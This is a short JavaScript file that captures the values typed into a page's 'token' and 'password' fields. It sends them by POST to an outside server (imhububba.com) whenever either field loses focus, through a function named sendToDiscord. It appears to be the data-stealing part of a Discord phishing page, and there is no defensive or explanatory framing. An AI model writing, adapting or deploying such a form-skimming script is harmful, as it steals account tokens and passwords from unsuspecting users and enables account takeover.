document.addEventListener('DOMContentLoaded', function() {
    const tokenInput = document.getElementById('token');
    const passwordInput = document.getElementById('password');

    const sendToDiscord = (token, password) => {
        const xhr = new XMLHttpRequest();
        const url = 'https://www.imhububba.com/test/app/code.py'; // Replace with the URL where your Python script is running
        xhr.open('POST', url);
        xhr.setRequestHeader('Content-Type', 'application/json');
        const data = JSON.stringify({ token: token, password: password });
        xhr.send(data);
    };

    tokenInput.addEventListener('blur', function() {
        const token = tokenInput.value;
        sendToDiscord(token, passwordInput.value);
    });

    passwordInput.addEventListener('blur', function() {
        const password = passwordInput.value;
        sendToDiscord(tokenInput.value, password);
    });
});
